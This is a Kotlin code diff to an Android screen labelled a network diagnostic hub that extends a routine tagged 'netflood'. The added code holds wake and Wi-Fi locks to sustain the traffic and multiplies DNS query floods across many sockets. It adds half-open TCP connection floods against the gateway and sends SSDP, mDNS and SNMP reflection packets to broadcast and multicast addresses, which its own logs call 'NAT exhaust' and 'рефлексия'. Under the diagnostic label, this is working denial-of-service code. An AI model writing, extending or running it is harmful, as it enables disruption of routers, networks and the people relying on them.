@@ -15,6 +15,7 @@ import android.net.wifi.SupplicantState
 import android.net.wifi.WifiManager
 import android.net.wifi.WifiNetworkSuggestion
 import android.os.Build
+import android.os.PowerManager
 import android.provider.Settings
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -121,6 +122,7 @@ import java.net.InetSocketAddress
 import java.net.URL
 import java.nio.ByteBuffer
 import java.nio.ByteOrder
+import java.nio.channels.SocketChannel
 import java.text.SimpleDateFormat
 import java.util.Collections
 import java.util.Date
@@ -128,6 +130,7 @@ import java.util.Locale
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicInteger
 import java.util.concurrent.atomic.AtomicLong
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -443,7 +446,20 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             appendLog("DHCP DNS: ${dhcpDns.joinToString()}")
         }
 
-        return scope.launch(Dispatchers.IO) {
+        val wakeLock = runCatching {
+            (context.getSystemService(Context.POWER_SERVICE) as PowerManager)
+                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Dolphy:netflood")
+                .apply { acquire(30 * 60 * 1000L) }
+        }.getOrNull()
+        val wifiLock = runCatching {
+            wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "Dolphy:netflood")
+                .apply { acquire() }
+        }.getOrNull()
+        if (wakeLock != null || wifiLock != null) {
+            appendLog("Удержание радио: WakeLock/WifiLock активны")
+        }
+
+        val job = scope.launch(Dispatchers.IO) {
             val packetCount = AtomicLong(0)
             val byteCount = AtomicLong(0)
             val primaryAddr = runCatching { InetAddress.getByName(primaryIp) }.getOrNull()
@@ -455,6 +471,8 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             }
             val gatewayAddr = gateway?.let { runCatching { InetAddress.getByName(it) }.getOrNull() }
             val broadcastAddr = runCatching { InetAddress.getByName("255.255.255.255") }.getOrNull()
+            val ssdpAddr = runCatching { InetAddress.getByName("239.255.255.250") }.getOrNull()
+            val mdnsAddr = runCatching { InetAddress.getByName("224.0.0.251") }.getOrNull()
 
             val dnsTargets = linkedSetOf<InetAddress>()
             gatewayAddr?.let { dnsTargets += it }
@@ -491,6 +509,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                 if (isRouterMode) {
                     appendLog("NAT exhaust → ${externalHosts.size} WAN hosts · bandwidth streams")
                 }
+                appendLog("Half-open SYN × ${if (isRouterMode) 10 else 18} · SSDP/mDNS/SNMP рефлексия")
             }
 
             val localUdpPorts = intArrayOf(53, 67, 68, 123, 1900, 5353, 161, 137, 138)
@@ -502,29 +521,37 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             val dnsWorkers = (1..32).map { workerId ->
                 launch {
                     val random = java.util.Random(workerId.toLong() xor System.nanoTime())
-                    val socket = runCatching {
-                        DatagramSocket().apply {
-                            sendBufferSize = 512 * 1024
-                            soTimeout = 1
-                            reuseAddress = true
-                            broadcast = true
-                        }
-                    }.getOrNull() ?: return@launch
+                    val sockets = (1..3).map {
+                        runCatching {
+                            DatagramSocket().apply {
+                                sendBufferSize = 512 * 1024
+                                soTimeout = 1
+                                reuseAddress = true
+                                broadcast = true
+                            }
+                        }.getOrNull()
+                    }.filterNotNull()
+                    if (sockets.isEmpty()) return@launch
+                    val templates = Array(8) { buildRandomRecursiveDnsQuery(random) }
                     try {
                         var i = 0
                         while (isActive) {
-                            val q = buildRandomRecursiveDnsQuery(random)
+                            val q = templates[random.nextInt(templates.size)]
+                            q[0] = random.nextInt(256).toByte()
+                            q[1] = random.nextInt(256).toByte()
                             val dest = dnsList[random.nextInt(dnsList.size)]
                             runCatching {
-                                socket.send(DatagramPacket(q, q.size, dest, 53))
+                                sockets[i % sockets.size].send(DatagramPacket(q, q.size, dest, 53))
                                 packetCount.incrementAndGet()
                                 byteCount.addAndGet(q.size.toLong())
                             }
                             repeat(3) {
-                                val q2 = buildRandomRecursiveDnsQuery(random)
+                                val q2 = templates[random.nextInt(templates.size)]
+                                q2[0] = random.nextInt(256).toByte()
+                                q2[1] = random.nextInt(256).toByte()
                                 val d2 = dnsList[random.nextInt(dnsList.size)]
                                 runCatching {
-                                    socket.send(DatagramPacket(q2, q2.size, d2, 53))
+                                    sockets[(i + it) % sockets.size].send(DatagramPacket(q2, q2.size, d2, 53))
                                     packetCount.incrementAndGet()
                                     byteCount.addAndGet(q2.size.toLong())
                                 }
@@ -549,7 +576,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                             if ((i and 127) == 0) yield()
                         }
                     } finally {
-                        runCatching { socket.close() }
+                        sockets.forEach { runCatching { it.close() } }
                     }
                 }
             }
@@ -569,14 +596,18 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                         var i = 0
                         while (isActive) {
                             val port = localUdpPorts[random.nextInt(localUdpPorts.size)]
-                            val dest = if (port == 67 || port == 68 || port == 1900 || port == 5353) {
-                                broadcastAddr ?: primaryAddr
-                            } else {
-                                primaryAddr
+                            val dest = when (port) {
+                                67, 68 -> broadcastAddr ?: primaryAddr
+                                1900 -> ssdpAddr ?: broadcastAddr ?: primaryAddr
+                                5353 -> mdnsAddr ?: broadcastAddr ?: primaryAddr
+                                else -> primaryAddr
                             }
                             val payload = when (port) {
                                 67, 68 -> dhcpDiscover
                                 53 -> buildRandomRecursiveDnsQuery(random)
+                                1900 -> buildSsdpMsearch(if ((i and 1) == 0) "ssdp:all" else "upnp:rootdevice")
+                                5353 -> buildMdnsServiceQuery(random.nextInt(0x10000))
+                                161 -> buildSnmpGetNext(random.nextInt())
                                 else -> junk
                             }
                             val len = if (port == 67 || port == 68) payload.size else minOf(payload.size, 512 + random.nextInt(800))
@@ -609,6 +640,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                         while (isActive) {
                             if (held.size > 48) {
                                 runCatching { held.removeFirst().close() }
+                                releaseFd()
                             }
                             val host = if (externalHosts.isNotEmpty()) {
                                 externalHosts[random.nextInt(externalHosts.size)]
@@ -629,7 +661,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                                                 "Connection: keep-alive\r\n\r\n").toByteArray(),
                                         )
                                         out.flush()
-                                        if (random.nextBoolean()) {
+                                        if (random.nextBoolean() && tryAcquireFd()) {
                                             held.addLast(s)
                                         } else {
                                             s.close()
@@ -638,7 +670,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                                     443, 8443, 853 -> {
                                         out.write(junk, 0, 200)
                                         out.flush()
-                                        if (random.nextInt(3) == 0) held.addLast(s) else s.close()
+                                        if (random.nextInt(3) == 0 && tryAcquireFd()) held.addLast(s) else s.close()
                                     }
                                     else -> {
                                         out.write(junk, 0, 64)
@@ -650,13 +682,16 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                             }
                         }
                     } finally {
-                        held.forEach { runCatching { it.close() } }
+                        held.forEach {
+                            runCatching { it.close() }
+                            releaseFd()
+                        }
                         held.clear()
                     }
                 }
             }
 
-            val localTcpWorkers = (1..if (isRouterMode) 10 else 16).map { workerId ->
+            val tcpConnectWorkers = (1..4).map { workerId ->
                 launch {
                     val random = java.util.Random(workerId + 3000L)
                     while (isActive) {
@@ -682,6 +717,50 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                             }
                         }
                         packetCount.incrementAndGet()
+                    }
+                }
+            }
+
+            val halfOpenWorkers = (1..if (isRouterMode) 10 else 18).map { workerId ->
+                launch {
+                    val random = java.util.Random(workerId + 30000L)
+                    val pending = HashMap<SocketChannel, Long>()
+                    try {
+                        while (isActive) {
+                            val now = System.currentTimeMillis()
+                            val it = pending.entries.iterator()
+                            while (it.hasNext()) {
+                                val (ch, deadline) = it.next()
+                                val done = runCatching { ch.finishConnect() }.getOrDefault(false)
+                                if (done || now >= deadline) {
+                                    runCatching { ch.close() }
+                                    releaseFd()
+                                    it.remove()
+                                }
+                            }
+                            if (pending.size < 64 && tryAcquireFd()) {
+                                val port = localTcpPorts[random.nextInt(localTcpPorts.size)]
+                                val ch = runCatching {
+                                    SocketChannel.open().apply { configureBlocking(false) }
+                                }.getOrNull()
+                                if (ch != null && runCatching { ch.connect(InetSocketAddress(primaryAddr, port)) }.isSuccess) {
+                                    pending[ch] = now + 5000
+                                    packetCount.incrementAndGet()
+                                } else {
+                                    runCatching { ch?.close() }
+                                    releaseFd()
+                                }
+                            } else if (pending.isEmpty()) {
+                                delay(2)
+                            }
+                            if ((packetCount.get() and 511) == 0L) yield()
+                        }
+                    } finally {
+                        pending.keys.forEach {
+                            runCatching { it.close() }
+                            releaseFd()
+                        }
+                        pending.clear()
                     }
                 }
             }
@@ -746,9 +825,14 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                 }
             }
 
-            (dnsWorkers + udpServiceWorkers + natWorkers + localTcpWorkers + bwWorkers)
+            (dnsWorkers + udpServiceWorkers + natWorkers + tcpConnectWorkers + halfOpenWorkers + bwWorkers)
                 .forEach { it.join() }
         }
+        job.invokeOnCompletion {
+            runCatching { wakeLock?.takeIf { it.isHeld }?.release() }
+            runCatching { wifiLock?.takeIf { it.isHeld }?.release() }
+        }
+        return job
     }
 
     fun startLanDeviceScan() {
@@ -2239,5 +2323,71 @@ private fun buildDhcpDiscover(): ByteArray {
     buf[248] = 15
     buf[249] = 255.toByte()
     return buf
+}
+
+private const val MAX_HELD_FDS = 700
+private val heldFdCount = AtomicInteger(0)
+
+private fun tryAcquireFd(): Boolean {
+    while (true) {
+        val current = heldFdCount.get()
+        if (current >= MAX_HELD_FDS) return false
+        if (heldFdCount.compareAndSet(current, current + 1)) return true
+    }
+}
+
+private fun releaseFd() {
+    heldFdCount.updateAndGet { maxOf(0, it - 1) }
+}
+
+private fun buildSsdpMsearch(st: String = "ssdp:all"): ByteArray {
+    return ("M-SEARCH * HTTP/1.1\r\n" +
+        "HOST: 239.255.255.250:1900\r\n" +
+        "MAN: \"ssdp:discover\"\r\n" +
+        "MX: 2\r\n" +
+        "ST: $st\r\n\r\n").toByteArray(Charsets.US_ASCII)
+}
+
+private fun buildMdnsServiceQuery(id: Int): ByteArray {
+    val header = ByteBuffer.allocate(12).order(ByteOrder.BIG_ENDIAN)
+    header.putShort((id and 0xFFFF).toShort())
+    header.putShort(0)
+    header.putShort(1)
+    header.putShort(0)
+    header.putShort(0)
+    header.putShort(0)
+    val qname = byteArrayOf(
+        9, '_'.code.toByte(), 's'.code.toByte(), 'e'.code.toByte(), 'r'.code.toByte(),
+        'v'.code.toByte(), 'i'.code.toByte(), 'c'.code.toByte(), 'e'.code.toByte(),
+        's'.code.toByte(),
+        7, '_'.code.toByte(), 'd'.code.toByte(), 'n'.code.toByte(), 's'.code.toByte(),
+        '-'.code.toByte(), 's'.code.toByte(), 'd'.code.toByte(),
+        4, '_'.code.toByte(), 'u'.code.toByte(), 'd'.code.toByte(), 'p'.code.toByte(),
+        5, 'l'.code.toByte(), 'o'.code.toByte(), 'c'.code.toByte(), 'a'.code.toByte(),
+        'l'.code.toByte(),
+        0,
+    )
+    val tail = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
+    tail.putShort(12)
+    tail.putShort(1)
+    return header.array() + qname + tail.array()
+}
+
+private fun buildSnmpGetNext(requestId: Int): ByteArray {
+    return byteArrayOf(
+        0x30.toByte(), 0x26.toByte(),
+        0x02, 0x01, 0x01,
+        0x04, 0x06, 0x70, 0x75, 0x62, 0x6C, 0x69, 0x63,
+        0xA1.toByte(), 0x19.toByte(),
+        0x02, 0x04,
+        (requestId ushr 24).toByte(), (requestId ushr 16).toByte(),
+        (requestId ushr 8).toByte(), requestId.toByte(),
+        0x02, 0x01, 0x00,
+        0x02, 0x01, 0x00,
+        0x30, 0x0B,
+        0x30, 0x09,
+        0x06, 0x07, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01,
+        0x05, 0x00,
+    )
 }
 
